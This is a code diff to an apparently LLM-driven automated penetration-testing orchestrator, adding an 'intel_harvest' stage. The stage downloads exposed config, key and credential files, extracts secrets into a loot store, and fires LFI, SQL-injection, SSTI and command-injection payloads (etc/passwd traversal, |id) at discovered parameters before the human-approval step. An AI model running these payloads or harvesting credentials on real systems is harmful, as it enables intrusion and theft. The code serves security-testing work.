@@ -9,7 +9,7 @@ orchestrator.py  ── 改进版
   6. parse_target 统一解析       → 创建 state 后立即解析，全链路使用 target_host/target_port
 
 流程（主机攻链优先）：
-  START → recon → surface_enum → vuln_scan → exploit_decision
+  START → recon → surface_enum → intel_harvest → vuln_scan → exploit_decision
         → human_approval（interrupt_before 暂停等待审批）
         → foothold_attempt → secondary_attack（可选）→ post_foothold_enum
         → privesc_attempt（可循环）→ objective_collect → report → END
@@ -49,6 +49,7 @@ TASK_TIMEOUT = int(os.getenv("TASK_TIMEOUT_SECONDS", "7200"))
 _CHAIN_PHASE_ORDER: list[str] = [
     "recon",
     "surface_enum",
+    "intel_harvest",
     "vuln_scan",
     "exploit_decision",
     "awaiting_approval",
@@ -131,6 +132,58 @@ def _operator_chat_block(state: PentestState) -> str:
     return "\n操作员实时补充（决策对话，请优先参考）：\n" + "\n".join(f"- {t}" for t in lines)
 
 
+def _build_dir_intel(state: PentestState) -> dict[str, Any]:
+    """Build structured directory intelligence from web_paths_inventory and related state."""
+    intel: dict[str, Any] = {
+        "high_value_paths": [],
+        "potential_entry_points": [],
+        "exposed_files": [],
+        "backup_files": [],
+        "api_endpoints": [],
+        "dir_listings": [],
+        "git_exposed": False,
+    }
+    _hv_hints = {"admin", "login", "upload", "info_disclosure"}
+    _api_hints = {"api"}
+    _backup_hints = {"backup"}
+    _config_hints = {"config", "leak"}
+
+    for item in (state.web_paths_inventory or []):
+        path = item.get("path", "")
+        hints = set(item.get("hints", []))
+        if not path:
+            continue
+        if hints & _hv_hints:
+            intel["high_value_paths"].append(path)
+        if hints & _api_hints:
+            intel["api_endpoints"].append(path)
+        if hints & _backup_hints:
+            intel["backup_files"].append(path)
+        if hints & _config_hints:
+            intel["exposed_files"].append(path)
+        if "?" in path or "=" in path:
+            intel["potential_entry_points"].append(path)
+
+    for p in (state.web_paths or []):
+        lower = p.lower()
+        if ".git" in lower:
+            intel["git_exposed"] = True
+        if any(lower.endswith(ext) for ext in (".bak", ".old", ".backup", ".swp", ".orig")):
+            if p not in intel["backup_files"]:
+                intel["backup_files"].append(p)
+
+    if state.dirlist_tree:
+        for dl_path in (state.dirlist_interesting_files or [])[:10]:
+            if dl_path not in intel["dir_listings"]:
+                intel["dir_listings"].append(dl_path)
+
+    for key in intel:
+        if isinstance(intel[key], list):
+            intel[key] = intel[key][:20]
+
+    return intel
+
+
 def _build_exploit_context(state: PentestState) -> dict[str, Any]:
     path_contents = state.path_contents or []
     path_content_summary = "无"
@@ -157,6 +210,11 @@ def _build_exploit_context(state: PentestState) -> dict[str, Any]:
     if state.dirlist_interesting_files:
         dirlist_info += f"\n有价值文件: {', '.join(state.dirlist_interesting_files[:15])}"
 
+    # Build structured directory intelligence for exploit decision
+    dir_intel: dict[str, Any] = state.dir_intel or {}
+    if not dir_intel:
+        dir_intel = _build_dir_intel(state)
+
     ctx: dict[str, Any] = {
         "ports_summary": ", ".join(
             f"{p.port}/{p.service}({p.version[:30]})" for p in state.open_ports[:20]
@@ -164,6 +222,7 @@ def _build_exploit_context(state: PentestState) -> dict[str, Any]:
         "web_paths": web_paths_str,
         "path_contents": path_content_summary,
         "dirlist_info": dirlist_info,
+        "dir_intel": dir_intel,
         "fingerprint": state.raw_recon.get("raw_nmap", "")[:500],
         "fingerprints": state.fingerprints,
         "extra_hint": state.extra_hint,
@@ -175,6 +234,25 @@ def _build_exploit_context(state: PentestState) -> dict[str, Any]:
             "单漏洞利用只是战术动作，需在链路上推进而非只追求命中一条 CVE。"
         ),
     }
+
+    if state.intel_files:
+        intel_lines = []
+        for f in state.intel_files[:10]:
+            intel = f.get("intel", {})
+            if intel.get("risk_level") in ("critical", "high"):
+                intel_lines.append(f"{f['path']}: {intel.get('summary', '')}")
+        if intel_lines:
+            ctx["intel_harvest_summary"] = "\n".join(intel_lines)
+
+    if state.page_params:
+        param_lines = []
+        for p in state.page_params:
+            status = "已验证" if p.get("verified") else "待验证"
+            param_lines.append(
+                f"{p['url']} [{p['vuln_type']}] param={p['param_name']} ({status})"
+            )
+        ctx["discovered_params"] = "\n".join(param_lines)
+
     oc = _operator_chat_block(state)
     if oc:
         ctx["operator_chat"] = oc
@@ -296,6 +374,7 @@ async def node_recon(state: PentestState) -> PentestState:
     state.subdomains = result.get("subdomains", [])
     state.raw_recon = _stringify_dict_keys(result)
     state.target_os = _infer_os(state.open_ports, state.os_info)
+    state.dir_scan_strategy = _stringify_dict_keys(result.get("scan_strategy", {}))
 
     # Emit dir-discovery coverage report as a decision event
     dir_cov = result.get("dir_coverage")
@@ -734,6 +813,416 @@ async def node_surface_enum(state: PentestState) -> PentestState:
     return state
 
 
+# ───────────────────────────────────────────────────────
+# intel_harvest — 文件情报提取 + 页面源码审计
+# ───────────────────────────────────────────────────────
+
+_FILE_EXTS = {
+    ".sql", ".conf", ".cfg", ".ini", ".xml", ".yaml", ".yml", ".json",
+    ".properties", ".bak", ".old", ".backup", ".env", ".htpasswd",
+    ".htaccess", ".log", ".txt", ".csv", ".key", ".pem",
+}
+_PAGE_EXTS = {".php", ".jsp", ".asp", ".aspx", ".py", ".cgi", ".do", ".action"}
+_BINARY_EXTS = {".zip", ".tar", ".gz", ".tgz", ".rar", ".7z", ".war", ".jar", ".class", ".exe", ".dll", ".so"}
+_SENSITIVE_KEYWORDS = {"password", "passwd", "token", "secret", "credential", "key", "auth"}
+_PAGE_KEYWORDS = {"login", "admin", "upload", "manager", "console"}
+_MAX_FILE_TARGETS = 15
+_MAX_PAGE_TARGETS = 15
+
+
+def _classify_harvest_targets(state: PentestState) -> tuple[list[str], list[str]]:
+    """Split discovered paths into file targets (Pipeline A) and page targets (Pipeline B)."""
+    file_candidates: list[str] = []
+    page_candidates: list[str] = []
+    seen: set[str] = set()
+
+    def _ext(p: str) -> str:
+        lower = p.lower().rstrip("/")
+        for ext in sorted(_FILE_EXTS | _PAGE_EXTS | _BINARY_EXTS, key=len, reverse=True):
+            if lower.endswith(ext):
+                return ext
+        return ""
+
+    for p in (state.dirlist_interesting_files or []):
+        ext = _ext(p)
+        if ext in _BINARY_EXTS or p in seen:
+            continue
+        seen.add(p)
+        if ext in _FILE_EXTS:
+            file_candidates.append(p)
+        elif ext in _PAGE_EXTS:
+            page_candidates.append(p)
+
+    for p in (state.web_paths or []):
+        if p in seen:
+            continue
+        ext = _ext(p)
+        if ext in _BINARY_EXTS:
+            continue
+        seen.add(p)
+        if ext in _FILE_EXTS:
+            file_candidates.append(p)
+        elif ext in _PAGE_EXTS:
+            page_candidates.append(p)
+
+    for pc in (state.path_contents or []):
+        p = pc.get("path", "")
+        if p in seen:
+            continue
+        kws = {k.lower() for k in (pc.get("keywords") or [])}
+        tech = pc.get("tech_clues") or []
+        if kws & _SENSITIVE_KEYWORDS:
+            seen.add(p)
+            file_candidates.append(p)
+        elif tech or kws & _PAGE_KEYWORDS:
+            seen.add(p)
+            page_candidates.append(p)
+
+    return file_candidates[:_MAX_FILE_TARGETS], page_candidates[:_MAX_PAGE_TARGETS]
+
+
+def _build_harvest_script(base_url: str, file_targets: list[str], page_targets: list[str]) -> str:
+    lines = [
+        'set +e',
+        f'BASE="{base_url}"',
+        "while IFS='|' read -r TYPE HPATH; do",
+        '  [ -z "$HPATH" ] && continue',
+        '  LIMIT=$( [ "$TYPE" = "page" ] && echo 12288 || echo 8192 )',
+        '  echo "__HARVEST_BEGIN__"',
+        '  echo "TYPE:$TYPE"',
+        '  echo "PATH:$HPATH"',
+        '  TMP_H=$(mktemp); TMP_B=$(mktemp)',
+        '  CODE=$(curl -sS -L --max-time 12 -D "$TMP_H" -o "$TMP_B" -w "%{http_code}" "$BASE$HPATH" 2>/dev/null || echo "000")',
+        '  echo "CODE:$CODE"',
+        '  HEADERS=$(head -c 1024 "$TMP_H" | tr \'\\r\' \' \')',
+        '  echo "HEADERS:$HEADERS"',
+        '  head -c $LIMIT "$TMP_B"',
+        '  echo ""',
+        '  echo "__HARVEST_END__"',
+        '  rm -f "$TMP_H" "$TMP_B"',
+        "done <<'EOF_TARGETS'",
+    ]
+    for p in file_targets:
+        lines.append(f"file|{p}")
+    for p in page_targets:
+        lines.append(f"page|{p}")
+    lines.append("EOF_TARGETS")
+    return "\n".join(lines)
+
+
+def _parse_harvest_output(raw: str) -> list[dict[str, Any]]:
+    results: list[dict[str, Any]] = []
+    blocks = raw.split("__HARVEST_BEGIN__")
+    for block in blocks[1:]:
+        end_idx = block.find("__HARVEST_END__")
+        if end_idx < 0:
+            continue
+        block = block[:end_idx]
+        entry: dict[str, Any] = {"type": "", "path": "", "code": "000", "headers": "", "body": ""}
+        body_lines: list[str] = []
+        header_done = False
+        for line in block.split("\n"):
+            if not header_done:
+                if line.startswith("TYPE:"):
+                    entry["type"] = line[5:].strip()
+                    continue
+                elif line.startswith("PATH:"):
+                    entry["path"] = line[5:].strip()
+                    continue
+                elif line.startswith("CODE:"):
+                    entry["code"] = line[5:].strip()
+                    continue
+                elif line.startswith("HEADERS:"):
+                    entry["headers"] = line[8:].strip()
+                    header_done = True
+                    continue
+            body_lines.append(line)
+        entry["body"] = "\n".join(body_lines).strip()
+        if entry["path"]:
+            results.append(entry)
+    return results
+
+
+_VULN_TYPE_NAMES = {
+    "lfi": "文件包含漏洞 (LFI)",
+    "sqli": "SQL 注入",
+    "cmdi": "命令注入 (CMDi)",
+    "ssti": "服务端模板注入 (SSTI)",
+    "ssrf": "SSRF",
+    "xss": "XSS",
+    "rfi": "远程文件包含 (RFI)",
+}
+
+
+def _check_verify_result(stdout: str, vuln_type: str) -> bool:
+    s = stdout.lower()
+    if vuln_type == "lfi":
+        return "root:x:0:0" in s or "/bin/bash" in s or "/bin/sh" in s
+    if vuln_type == "sqli":
+        sql_errors = ["sql syntax", "mysql", "sqlite", "postgresql", "ora-", "unclosed quotation"]
+        return any(e in s for e in sql_errors)
+    if vuln_type == "ssti":
+        return "49" in stdout
+    if vuln_type == "cmdi":
+        return "uid=" in s
+    return False
+
+
+@retry_node()
+async def node_intel_harvest(state: PentestState) -> PentestState:
+    """Pipeline between surface_enum and vuln_scan: download files + audit page source."""
+    from backend.llm.router import LLMRouter
+    from backend.llm.prompts.templates import FILE_INTEL_EXTRACT, PAGE_SOURCE_AUDIT
+    from backend.tools.executor import ToolExecutor
+
+    state.current_phase = "intel_harvest"
+    _record_chain_visit(state, "intel_harvest")
+    state.log("情报采集: 文件情报提取 + 页面源码审计")
+
+    file_targets, page_targets = _classify_harvest_targets(state)
+    if not file_targets and not page_targets:
+        state.log("情报采集: 无高价值目标，跳过")
+        return state
+
+    state.log(f"情报采集: 文件目标 {len(file_targets)} 个, 页面目标 {len(page_targets)} 个")
+
+    host = state.target_host or state.target
+    web_ports = [
+        p for p in state.open_ports
+        if p.port in (80, 443, 8080, 8443, 8000, 8888, 8081, 8090, 9000, 9090)
+        or "http" in (p.service or "").lower()
+    ]
+    if not web_ports:
+        state.log("情报采集: 未发现 Web 端口，跳过")
+        return state
+
+    wp = web_ports[0]
+    scheme = "https" if wp.port in (443, 8443) else "http"
+    base_url = f"{scheme}://{host}:{wp.port}"
+
+    executor = ToolExecutor()
+
+    async def _on_tool_log(line: str):
+        state.log(line)
+
+    async def _on_exec_record(record: dict):
+        _append_tool_record(state, record, default_phase="intel_harvest")
+
+    # ── Step B: batch download ──
+    script = _build_harvest_script(base_url, file_targets, page_targets)
+    try:
+        dl_result = await executor.run_script(
+            script_content=script,
+            timeout=max(30, 15 * (len(file_targets) + len(page_targets))),
+            log_callback=_on_tool_log,
+            record_callback=_on_exec_record,
+            record_phase="intel_harvest",
+            record_purpose="batch_download",
+        )
+    except Exception as e:
+        state.log(f"情报采集: 批量下载失败 — {e}")
+        return state
+
+    harvested = _parse_harvest_output(dl_result.stdout or "")
+    if not harvested:
+        state.log("情报采集: 下载结果为空，跳过 LLM 分析")
+        return state
+
+    state.log(f"情报采集: 下载完成, 共 {len(harvested)} 个目标")
+
+    # ── Step C: LLM analysis (concurrent, semaphore=3) ──
+    llm = LLMRouter()
+    sem = asyncio.Semaphore(3)
+
+    async def _analyze_file(entry: dict) -> dict[str, Any] | None:
+        if not entry["body"] or entry["code"] in ("000", "404"):
+            return None
+        prompt = FILE_INTEL_EXTRACT.format(
+            target=state.target,
+            file_path=entry["path"],
+            status_code=entry["code"],
+            file_content=entry["body"][:8192],
+        )
+        async with sem:
+            try:
+                raw = await llm.chat(prompt, response_format="json", temperature=0.1, max_tokens=2048)
+                return json.loads(raw)
+            except Exception as exc:
+                logger.warning(f"[IntelHarvest] LLM file analysis failed for {entry['path']}: {exc}")
+                return None
+
+    async def _analyze_page(entry: dict) -> dict[str, Any] | None:
+        if not entry["body"] or entry["code"] in ("000", "404"):
+            return None
+        prompt = PAGE_SOURCE_AUDIT.format(
+            target=state.target,
+            page_url=f"{base_url}{entry['path']}",
+            status_code=entry["code"],
+            response_headers=entry["headers"][:512],
+            page_source=entry["body"][:12288],
+        )
+        async with sem:
+            try:
+                raw = await llm.chat(prompt, response_format="json", temperature=0.1, max_tokens=2048)
+                return json.loads(raw)
+            except Exception as exc:
+                logger.warning(f"[IntelHarvest] LLM page audit failed for {entry['path']}: {exc}")
+                return None
+
+    file_entries = [e for e in harvested if e["type"] == "file"]
+    page_entries = [e for e in harvested if e["type"] == "page"]
+
+    file_tasks = [_analyze_file(e) for e in file_entries]
+    page_tasks = [_analyze_page(e) for e in page_entries]
+    all_results = await asyncio.gather(*(file_tasks + page_tasks), return_exceptions=True)
+
+    file_results = all_results[:len(file_tasks)]
+    page_results = all_results[len(file_tasks):]
+
+    # ── Step E (Pipeline A): inject file intel into state ──
+    for entry, intel in zip(file_entries, file_results):
+        if isinstance(intel, Exception) or intel is None:
+            continue
+        state.intel_files.append({
+            "path": entry["path"],
+            "content_snippet": entry["body"][:200],
+            "intel": intel,
+        })
+
+        for cred in (intel.get("credentials") or []):
+            if cred.get("confidence") != "low":
+                state.credential_store.append(cred)
+
+        for secret in (intel.get("secrets") or []):
+            state.loot_store.append({"type": "secret", **secret})
+
+        risk = intel.get("risk_level", "none")
+        if risk in ("critical", "high"):
+            state.findings.append(VulnFinding(
+                name=f"信息泄露 - {entry['path']}",
+                severity=risk,
+                target=f"{base_url}{entry['path']}",
+                port=wp.port,
+                description=intel.get("summary", ""),
+                evidence=entry["body"][:300],
+                exploitable=True,
+                tool="intel_harvest",
+            ))
+
+        for np in (intel.get("new_paths") or []):
+            if np and np not in state.web_paths:
+                state.web_paths.append(np)
+
+    # ── Step D + E (Pipeline B): verify params & inject findings ──
+    for entry, audit in zip(page_entries, page_results):
+        if isinstance(audit, Exception) or audit is None:
+            continue
+
+        page_url = f"{base_url}{entry['path']}"
+
+        for hp in (audit.get("hidden_paths") or []):
+            if hp and hp not in state.web_paths:
+                state.web_paths.append(hp)
+
+        for leak in (audit.get("leaked_info") or []):
+            state.loot_store.append({"source": entry["path"], **leak})
+
+        for param in (audit.get("injectable_params") or []):
+            param_url = param.get("url", "")
+            if not param_url:
+                continue
+
+            # Step D: auto-verify high/medium confidence params
+            verified = False
+            verify_evidence = ""
+            vtype = param.get("vuln_type", "unknown")
+            conf = param.get("confidence", "low")
+
+            if conf != "low":
+                verify_cmd = None
+                if vtype == "lfi":
+                    verify_cmd = (
+                        f'for d in 3 5 7; do '
+                        f'TRAV=$(printf "../%.0s" $(seq 1 $d)); '
+                        f'RESP=$(curl -sS --max-time 5 "{param_url}${{TRAV}}etc/passwd"); '
+                        f'echo "DEPTH=$d"; echo "$RESP" | head -5; '
+                        f'echo "---"; done'
+                    )
+                elif vtype == "sqli":
+                    verify_cmd = f"curl -sS --max-time 5 \"{param_url}' OR '1'='1\""
+                elif vtype == "ssti":
+                    verify_cmd = f'curl -sS --max-time 5 "{param_url}{{{{7*7}}}}"'
+                elif vtype == "cmdi":
+                    verify_cmd = f'curl -sS --max-time 5 "{param_url}|id"'
+
+                if verify_cmd:
+                    try:
+                        vr = await executor.run_script(
+                            script_content=verify_cmd,
+                            timeout=20,
+                            log_callback=_on_tool_log,
+                            record_callback=_on_exec_record,
+                            record_phase="intel_harvest",
+                            record_purpose=f"verify_{vtype}",
+                        )
+                        verify_evidence = (vr.stdout or "")[:500]
+                        verified = _check_verify_result(vr.stdout or "", vtype)
+                    except Exception as exc:
+                        logger.debug(f"[IntelHarvest] verify failed for {param_url}: {exc}")
+
+            param_record = {
+                "url": param_url,
+                "param_name": param.get("param_name", ""),
+                "method": param.get("method", "GET"),
+                "vuln_type": vtype,
+                "confidence": conf,
+                "source": param.get("source", ""),
+                "evidence": param.get("evidence", ""),
+                "verified": verified,
+                "verify_evidence": verify_evidence,
+            }
+            state.page_params.append(param_record)
+
+            if verified:
+                vuln_label = _VULN_TYPE_NAMES.get(vtype, vtype.upper())
+                state.findings.append(VulnFinding(
+                    name=f"{vuln_label} - {param.get('param_name', '')}",
+                    severity="high",
+                    target=param_url,
+                    port=wp.port,
+                    description=f"页面 {page_url} 的 {param.get('param_name', '')} 参数存在{vuln_label}",
+                    evidence=verify_evidence[:500],
+                    exploitable=True,
+                    tool="intel_harvest",
+                ))
+                state.log(f"情报采集: 已验证 {vuln_label} @ {param_url}")
+
+    # Summary
+    verified_count = sum(1 for p in state.page_params if p.get("verified"))
+    state.log(
+        f"情报采集完成: "
+        f"文件情报 {len(state.intel_files)} 份, "
+        f"发现参数 {len(state.page_params)} 个 "
+        f"(已验证 {verified_count})"
+    )
+    state.push_decision({
+        "action": "thought",
+        "phase": "intel_harvest",
+        "thinking": (
+            f"情报采集完成: 分析了 {len(file_entries)} 个文件和 {len(page_entries)} 个页面. "
+            f"提取文件情报 {len(state.intel_files)} 份, "
+            f"发现注入参数 {len(state.page_params)} 个, "
+            f"其中已验证 {verified_count} 个."
+        ),
+        "purpose": "情报采集总结",
+        "message": (
+            f"情报采集: {len(state.intel_files)} 文件情报, "
+            f"{len(state.page_params)} 参数 ({verified_count} 已验证)"
+        ),
+    })
+    return state
+
+
 async def node_exploit_decision(state: PentestState) -> PentestState:
     from backend.llm.router import LLMRouter
     state.current_phase = "exploit_decision"
@@ -1155,6 +1644,7 @@ def build_graph(checkpointer=None):
     graph.add_node("recon",               node_recon)
     graph.add_node("vuln_scan",           node_vuln_scan)
     graph.add_node("surface_enum",        node_surface_enum)
+    graph.add_node("intel_harvest",       node_intel_harvest)
     graph.add_node("exploit_decision",    node_exploit_decision)
     graph.add_node("human_approval",      node_human_approval)
     graph.add_node("foothold_attempt",    node_foothold_attempt)
@@ -1166,7 +1656,8 @@ def build_graph(checkpointer=None):
 
     graph.add_edge(START, "recon")
     graph.add_edge("recon", "surface_enum")
-    graph.add_edge("surface_enum", "vuln_scan")
+    graph.add_edge("surface_enum", "intel_harvest")
+    graph.add_edge("intel_harvest", "vuln_scan")
     graph.add_edge("vuln_scan", "exploit_decision")
     graph.add_conditional_edges(
         "exploit_decision", edge_should_exploit,
@@ -1388,11 +1879,14 @@ def _build_exploit_decision_prompt(state: PentestState) -> str:
         [p.model_dump() for p in state.open_ports[:20]],
         ensure_ascii=False,
     )
+    dir_intel = state.dir_intel or _build_dir_intel(state)
+    dir_intel_json = json.dumps(dir_intel, ensure_ascii=False, indent=2)
     base_prompt = EXPLOIT_DECISION.format(
         target=state.target,
         target_os=state.target_os,
         ports_json=ports_json,
         findings_json=findings_json,
+        dir_intel_json=dir_intel_json,
     )
     extras: list[str] = []
     if state.workflow_mode and state.workflow_mode != "standard":
